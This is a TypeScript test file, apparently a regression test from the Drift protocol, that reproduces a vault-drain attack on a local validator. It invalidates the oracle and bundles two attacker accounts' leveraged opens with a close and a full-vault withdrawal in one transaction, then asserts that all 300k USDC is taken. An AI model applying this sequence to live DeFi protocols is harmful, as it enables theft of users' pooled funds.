import * as anchor from '@project-serum/anchor';
import { BN, ClearingHouseUser, Markets } from '../sdk/src';
import { assert } from 'chai';

import { Program, Wallet } from '@project-serum/anchor';

import { Keypair, PublicKey, Transaction } from '@solana/web3.js';

import { Admin, ClearingHouse } from '../sdk/src';

import { mockOracle, mockUSDCMint, mockUserUSDCAccount } from './testHelpers';
import {
	calculateMarkPrice,
	OracleSource,
	PositionDirection,
	QUOTE_PRECISION,
} from '../sdk';

describe('drift drain', () => {
	const provider = anchor.AnchorProvider.local(undefined, {
		commitment: 'confirmed',
		preflightCommitment: 'confirmed',
	});
	const connection = provider.connection;
	anchor.setProvider(provider);
	const chProgram = anchor.workspace.ClearingHouse as Program;

	let usdcMint;
	let admin: Admin;

	// SOL amm config when paused
	const ammQuoteAssetReserve = new BN('5000000000000000000');
	const ammBaseAssetReserve = new BN('5000000000000000000');
	const peg = new BN(53000);

	const usdcAmount = new BN(100000 * 10 ** 6);

	it('drain', async () => {
		usdcMint = await mockUSDCMint(provider);

		admin = Admin.from(connection, provider.wallet, chProgram.programId, {
			commitment: 'confirmed',
		});
		await admin.initialize(usdcMint.publicKey, false);

		const userUSDCAccount = await mockUserUSDCAccount(
			usdcMint,
			usdcAmount,
			provider,
			provider.wallet.publicKey
		);

		await admin.subscribe();

		// huge confidence to make oracle invalid
		const solUsd = await mockOracle(53, -7, 2147483647);
		const periodicity = new BN(60 * 60); // 1 HOUR

		await admin.initializeMarket(
			Markets[0].marketIndex,
			solUsd,
			ammBaseAssetReserve,
			ammQuoteAssetReserve,
			periodicity,
			peg,
			OracleSource.PYTH,
			500,
			333,
			222
		);

		// deposit first 100k
		await admin.initializeUserAccountAndDepositCollateral(
			usdcAmount,
			userUSDCAccount.publicKey
		);

		const createUser = async (): Promise<
			[Keypair, ClearingHouse, ClearingHouseUser, PublicKey]
		> => {
			const userKeyPair = new Keypair();
			await provider.connection.requestAirdrop(userKeyPair.publicKey, 10 ** 9);
			const userUSDCAccount = await mockUserUSDCAccount(
				usdcMint,
				usdcAmount,
				provider,
				userKeyPair.publicKey
			);
			const clearingHouse = ClearingHouse.from(
				connection,
				new Wallet(userKeyPair),
				chProgram.programId,
				{
					commitment: 'confirmed',
				}
			);
			await clearingHouse.subscribe();
			await clearingHouse.initializeUserAccountAndDepositCollateral(
				usdcAmount,
				userUSDCAccount.publicKey
			);

			const clearingHouseUser = ClearingHouseUser.from(
				clearingHouse,
				userKeyPair.publicKey
			);
			await clearingHouseUser.subscribe();

			return [
				userKeyPair,
				clearingHouse,
				clearingHouseUser,
				userUSDCAccount.publicKey,
			];
		};

		const [
			_,
			firstClearingHouse,
			firstClearingHouseUser,
			firstUserUSDCAccount,
		] = await createUser();
		const [secondKeypair, secondClearingHouse, secondClearingHouseUser] =
			await createUser();

		console.log(
			'price before',
			calculateMarkPrice(admin.getMarket(0)).toString()
		);

		const solMarketIndex = new BN(0);
		const leverage = new BN(20);

		// assert 300k deposited
		// whole vault is 300k, admin has 100k, second user has 100k, third user has 100k
		const wholeVaultBefore = new BN(
			(
				await admin.connection.getTokenAccountBalance(
					admin.getStateAccount().collateralVault
				)
			).value.amount
		);
		// whole vault 300k
		assert(wholeVaultBefore.eq(new BN(300000).mul(QUOTE_PRECISION)));
		const adminCollateralBefore = (await admin.getUserAccount()).collateral;
		// admin has 100k
		assert(adminCollateralBefore.eq(new BN(100000).mul(QUOTE_PRECISION)));
		const firstUserCollateralBefore =
			firstClearingHouseUser.getUserAccount().collateral;
		// first attacker account has 100k
		assert(firstUserCollateralBefore.eq(new BN(100000).mul(QUOTE_PRECISION)));
		const secondUserCollateralBefore =
			secondClearingHouseUser.getUserAccount().collateral;
		// second attacker account has 100k
		assert(secondUserCollateralBefore.eq(new BN(100000).mul(QUOTE_PRECISION)));

		const firstUserOpenIx = await firstClearingHouse.getOpenPositionIx(
			PositionDirection.LONG,
			usdcAmount.mul(leverage),
			solMarketIndex
		);
		const secondUserOpenIx = await secondClearingHouse.getOpenPositionIx(
			PositionDirection.LONG,
			usdcAmount.mul(leverage),
			solMarketIndex
		);
		const firstUserCloseIx = await firstClearingHouse.getClosePositionIx(
			solMarketIndex
		);
		const firstUserWithdrawIx =
			await firstClearingHouse.getWithdrawCollateralIx(
				wholeVaultBefore,
				firstUserUSDCAccount
			);

		// first user opens, second user opens, first closes, first withdraws
		const tx = new Transaction()
			.add(firstUserOpenIx)
			.add(secondUserOpenIx)
			.add(firstUserCloseIx)
			.add(firstUserWithdrawIx);

		await firstClearingHouse.txSender.send(tx, [secondKeypair]);

		// assert first user takes whole vault (300k) so up 100k
		const firstUserBalanceAfter = new BN(
			(
				await firstClearingHouse.connection.getTokenAccountBalance(
					firstUserUSDCAccount
				)
			).value.amount
		);
		assert(wholeVaultBefore.eq(firstUserBalanceAfter));

		await admin.unsubscribe();
		await firstClearingHouse.unsubscribe();
		await firstClearingHouseUser.unsubscribe();
		await secondClearingHouse.unsubscribe();
		await secondClearingHouseUser.unsubscribe();
	});
});
